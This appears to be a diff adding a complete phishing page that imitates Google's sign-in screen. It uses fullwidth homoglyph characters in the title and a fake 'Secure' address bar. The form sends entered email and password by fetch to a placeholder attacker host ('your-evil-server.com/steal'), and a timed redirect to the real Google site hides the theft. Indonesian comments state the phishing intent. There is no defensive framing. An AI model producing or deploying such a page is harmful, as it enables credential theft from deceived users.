@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in - ｇｏｏｇｌｅ.com</title>
+  <style>
+    body { margin: 0; font-family: Arial, sans-serif; background: #fff; }
+    .container { max-width: 400px; margin: 50px auto; padding: 20px; }
+    .logo { text-align: center; margin-bottom: 20px; }
+    .logo img { width: 100px; }
+    .form-group { margin-bottom: 15px; }
+    .form-group label { display: block; font-size: 14px; color: #555; }
+    .form-group input { width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ddd; border-radius: 4px; }
+    .btn { background: #4285f4; color: #fff; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
+    .btn:hover { background: #357abd; }
+    .fake-url { position: fixed; top: 0; left: 0; width: 100%; background: #f1f1f1; padding: 5px; font-size: 12px; color: green; }
+  </style>
+</head>
+<body>
+  <div class="fake-url">https://ｇｏｏｇｌｅ.com (Secure)</div>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+    </div>
+    <h2>Sign in to Google</h2>
+    <p>Get the most from your Google account</p>
+    <form id="spoofForm" action="http://your-evil-server.com/steal" method="POST">
+      <div class="form-group">
+        <label for="email">Email or phone</label>
+        <input type="text" id="email" name="email" placeholder="example@gmail.com" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      </div>
+      <button type="submit" class="btn">Next</button>
+    </form>
+    <p style="font-size: 12px; color: #555;">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+  </div>
+
+  <script>
+    // Redirect setelah 5 detik biar kelihatan sah
+    setTimeout(() => window.location.href = 'https://google.com', 5000);
+
+    // Auto-submit buat phish cepat
+    document.getElementById('spoofForm').onsubmit = function(e) {
+      e.preventDefault();
+      fetch(this.action, {
+        method: 'POST',
+        body: new FormData(this)
+      }).then(() => alert('Data sent, redirecting...'));
+    };
+  </script>
+</body>
+</html>
